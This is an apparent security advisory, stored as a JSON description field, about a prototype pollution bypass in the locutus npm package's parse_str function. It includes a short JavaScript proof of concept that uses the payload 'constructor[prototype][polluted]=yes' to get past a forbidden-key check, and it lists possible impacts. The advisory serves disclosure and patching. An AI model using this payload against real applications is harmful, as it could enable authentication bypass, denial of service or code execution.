    "Description": "### Summary\nA Prototype Pollution vulnerability exists in the the npm package locutus (\u003e2.0.12). Despite a previous fix that attempted to mitigate Prototype Pollution by checking whether user input contained a forbidden key, it is still possible to pollute Object.prototype via a crafted input using String.prototype. This issue was fixed in version 2.0.39.\n\n### Details\nThe vulnerability resides in line 77 to 79 of https://github.com/locutusjs/locutus/blob/main/src/php/strings/parse_str.js where includes() function is used to check whether user provided input contain forbidden strings.\n\n### PoC\n\n#### Steps to reproduce\n1. Install latest version of locutus using npm install or cloning from git\n2. Run the following code snippet:\n\n```javascript\nString.prototype.includes = () =\u003e false;      \nconsole.log({}.polluted);\nconst locutus = require('locutus');\nlocutus.php.strings.parse_str('constructor[prototype][polluted]=yes');\nconsole.log({}.polluted);  // prints yes -\u003e indicating that the patch was bypassed and Prototype Pollution occurred\n```\n\n#### Expected behavior\nPrototype Pollution should be prevented and {} should not gain new properties.\nThis should be printed on the console:\n```\nundefined\nundefined OR throw an Error\n```\n\n#### Actual behavior\nObject.prototype is polluted\nThis is printed on the console:\n```\nundefined \nyes\n```\n\n### Impact\nThis is a Prototype Pollution vulnerability, which can have severe security implications depending on how locutus is used by downstream applications. Any application that processes attacker-controlled input using this `locutus.php.strings.parse_str` may be affected. It could potentially lead to the following problems:\n1. Authentication bypass\n2. Denial of service\n3. Remote code execution (if polluted property is passed to sinks like eval or child_process)",
